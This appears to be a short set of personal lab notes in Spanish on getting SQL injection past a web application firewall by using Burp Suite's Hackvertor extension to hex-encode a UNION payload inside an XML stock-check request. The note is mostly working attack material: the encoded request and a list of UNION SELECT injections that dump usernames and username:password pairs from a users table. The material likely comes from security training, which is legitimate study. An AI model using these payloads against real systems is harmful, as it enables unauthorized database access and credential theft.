# Inyección SQL Bypass con XML encoding 

Tags: #SQLI #XML  #BurpSuite 

```mysql 
1. Instalar la extención 'Hackvertor'
2. Al payload que se quiera encodear de la estructura XML para pasar el WAF hacer lo siguiente: 
	1. Seleccionar el codigo a encodear 
	2. Ir a 'Extensions > Hackvertor > Encode > hex_entities'
```

```xml
# Forma original 

<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			1
		</productId>
		<storedId>
			1
		</storedId>
	</stockCheck>
```

```xml 
# Forma encodeada donde el payload lo transformará a una cadena hexadecimal 

<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
			1
		</productId>
		<storedId>
			<@hex_entities>
				1 union select NULL 
			</@hex_entities>
		</storedId>
	</stockCheck>


# Se pueden agregar las siguientes inyecciones: 
❯ union select 'test'          # Funciona para ver si se puede reflejar el texto 
❯ union select username from users where username='administrator'
❯ union select username||':'||password from users 
```